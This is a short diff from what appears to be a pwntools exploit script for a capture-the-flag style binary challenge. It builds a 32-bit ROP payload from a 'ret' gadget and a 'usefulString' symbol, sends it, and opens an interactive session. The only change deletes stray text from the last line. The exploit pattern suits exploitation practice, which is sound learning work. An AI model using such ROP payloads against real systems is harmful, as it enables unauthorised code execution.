@@ -10,4 +10,4 @@ payload += p32(rop.find_gadget(['ret']).address)
 payload += p32(e.symbols['usefulString'])
 
 p.send(payload)
-p.interactive()x86 function prologue and epilogue
+p.interactive()
